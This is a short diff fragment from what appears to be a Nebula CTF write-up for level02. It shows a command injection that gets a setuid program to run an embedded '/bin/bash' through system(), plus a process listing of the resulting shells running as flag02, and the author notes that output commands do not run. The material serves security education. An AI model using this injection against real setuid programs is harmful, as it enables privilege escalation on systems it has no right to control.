@@ -56,3 +56,13 @@ level02@nebula:~$ /home/flag02/flag02
 about to call system("/bin/echo `/bin/bash` is cool")
 flag02@nebula:~$
 
+c. issues with this sol.
+No commands are not running --;
+
+Three processes are running as flag02 privileges
+nebula@nebula:~$ ps -ef | grep flag02
+flag02    5209  5106  0 04:40 pts/0    00:00:00 /home/flag02/flag02
+flag02    5210  5209  0 04:40 pts/0    00:00:00 sh -c /bin/echo `/bin/bash` is cool
+flag02    5211  5210  0 04:40 pts/0    00:00:00 sh -c /bin/echo `/bin/bash` is cool
+flag02    5212  5211  1 04:40 pts/0    00:00:00 /bin/bash
+
